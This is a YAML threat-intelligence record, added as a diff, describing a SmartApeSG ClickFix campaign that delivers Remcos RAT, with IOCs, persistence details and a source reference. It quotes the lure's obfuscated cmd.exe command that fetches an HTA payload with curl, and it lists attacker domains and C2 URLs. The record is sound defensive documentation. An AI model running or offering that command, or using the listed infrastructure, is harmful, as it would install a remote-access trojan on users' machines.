@@ -1,0 +1,49 @@
+description: SmartApeSG campaign uses ClickFix page to push Remcos RAT
+malware_families:
+- Remcos
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - open %COMSPEC% /e start "" /min %COMSPEC% /v:on /c "setBet=xxcurlee & set hgreeen=%LocallppData%\Menstraliscss.hta & call !Bet:~2,4! -3 -L -o !hgreeen!"
+  powershell: []
+  scripting_engine:
+  - VBS
+  - JScript
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load:
+  - Menstraliscss.hta
+  network_connections:
+  - forcebiturg.com/boot
+  - forcebiturg.com/proc
+  - 193.178.170.155:443
+  file_activity:
+  - C:\\Users\\[username]\\AppData\\Local\\Temp\\594653818\\594653818.pdf
+  persistence:
+  - Update to the Windows Registry
+  process_relations: []
+IOCs:
+  hashes:
+  - b170ffc8612618c822eb03030a8a62d4be8d6a77a11e4e41bb075393ca504ab7
+  ip_addresses:
+  - 193.178.170.155
+  domains:
+  - cpajoliette.com
+  - retrypoti.top
+  - forcebiturg.com
+  urls:
+  - hxxps://cpajoliette[.]com/d.js
+  - hxxps://retrypoti[.]top/endpoint/signin-cache.js
+  - hxxps://retrypoti[.]top/endpoint/login-asset.php?Iah0QU0N
+  - hxxps://retrypoti[.]top/endpoint/handler-css.js?00109a4cb788daa811
+  - hxxp://forcebiturg[.]com/boot
+  - hxxps://forcebiturg[.]com/boot
+  - hxxp://forcebiturg[.]com/proc
+  - hxxps://forcebiturg[.]com/proc
+authors:
+- Bradley Duncan
+reference: https://isc.sans.edu/forums/diary/SmartApeSG+campaign+uses+ClickFix+page+to+push+Remcos+RAT/32796
+date_of_publication: March 14, 2026
+file_creation_date: March 14, 2026
